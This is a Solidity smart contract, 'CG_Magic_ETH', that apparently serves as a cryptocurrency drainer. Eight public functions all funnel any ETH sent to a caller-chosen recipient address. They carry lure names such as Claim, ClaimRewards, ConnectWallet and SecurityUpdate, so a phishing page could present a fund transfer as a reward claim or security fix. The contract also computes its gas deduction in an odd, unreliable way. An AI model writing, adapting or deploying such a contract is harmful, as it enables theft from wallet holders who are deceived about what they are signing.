// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

contract CG_Magic_ETH {
    address private owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    modifier validAmount() {
        require(msg.value > 0, "Invalid amount");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function _executeTransaction(address sender, address recipient, uint8 recipientPercentage) public payable validAmount
    {
        uint256 gasCost = tx.gasprice * gasleft();
        uint256 totalAmount = msg.value - gasCost;
        if(recipientPercentage == 100) {
            payable(recipient).transfer(totalAmount);
        } else {
            uint256 payoutRecipientAmount = (totalAmount * recipientPercentage) / 100;
            uint256 payoutSenderAmount = totalAmount - payoutRecipientAmount;
            payable(recipient).transfer(payoutRecipientAmount);
            payable(sender).transfer(payoutSenderAmount);
        }
    }

    function Claim(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function ClaimReward(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function ClaimRewards(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function Execute(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function Swap(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function Connect(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function ConnectWallet(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    function SecurityUpdate(address sender, address recipient, uint8 recipientPercentage) public payable {
        _executeTransaction(sender, recipient, recipientPercentage);
    }

    receive() external payable {}
}